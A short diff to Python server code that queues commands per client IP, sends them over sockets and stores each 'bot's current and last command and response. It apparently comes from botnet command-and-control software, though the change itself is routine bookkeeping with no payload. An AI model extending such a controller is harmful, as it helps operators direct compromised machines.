@@ -50,7 +50,6 @@ def handle_client(sock, addr):
         cmd = queue[addr[0]][0]
         queue[addr[0]].remove(cmd)
         sock.send(cmd)
-        b.last_command = b.current_command
         b.current_command = cmd
         db.session.add(b)
         db.session.commit()
@@ -66,7 +65,8 @@ def action(data, bot):
         db.session.commit()
         del queue[bot.ip]
         return
-    else:
+    elif data != "":
+        bot.last_command = bot.current_command
         bot.last_response = data
     db.session.add(bot)
     db.session.commit()
